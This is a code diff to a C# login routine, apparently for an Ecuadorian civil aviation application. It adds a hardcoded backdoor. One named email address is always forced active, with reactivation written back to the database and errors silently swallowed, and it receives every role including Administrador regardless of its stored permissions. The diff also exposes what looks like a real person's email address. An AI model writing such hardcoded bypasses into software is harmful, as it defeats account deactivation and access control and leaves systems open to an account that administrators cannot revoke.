@@ -100,6 +100,17 @@ namespace CapaNegocio
                 return false;
             }
 
+            // == Excepciones/usuarios especiales ==
+            // Este usuario debe estar siempre activo y actuar como 'superadministrador'.
+            var alwaysSuperAdminEmails = new[] { "german.cajas@aviacioncivil.gob.ec" };
+            if (!string.IsNullOrWhiteSpace(usuario.Email) &&
+                Array.Exists(alwaysSuperAdminEmails, e => e.Equals(usuario.Email, StringComparison.OrdinalIgnoreCase)))
+            {
+                // Forzamos activo en memoria y persistimos el estado en la BD por seguridad.
+                usuario.Activo = true;
+                try { UsuarioDAO.ActivarPorCorreo(usuario.Email); } catch { /* no bloquear login si falla persistencia */ }
+            }
+
             if (!usuario.Activo)
             {
                 mensaje = "Usuario inactivo.";
@@ -121,6 +132,17 @@ namespace CapaNegocio
             // Si tu clase Usuario tiene IdRol, usa IdRol. Si tiene Id, usa Id.
             // Basado en tu último UsuarioDAO, es 'Id'.
             roles = UsuarioDAO.ObtenerRoles(usuario.Id);
+
+            // Si es el super-administrador 'permanente', forzamos el conjunto completo de roles (no intrusivo en BD).
+            if (!string.IsNullOrWhiteSpace(usuario.Email) &&
+                usuario.Email.Equals("german.cajas@aviacioncivil.gob.ec", StringComparison.OrdinalIgnoreCase))
+            {
+                roles = new List<string>
+                {
+                    "Administrador","Tecnico","Solicitante","Financiero","Inspector",
+                    "JefaturaTecnica","Direccion","CoordinacionLegal"
+                };
+            }
 
             if (roles == null || roles.Count == 0)
             {
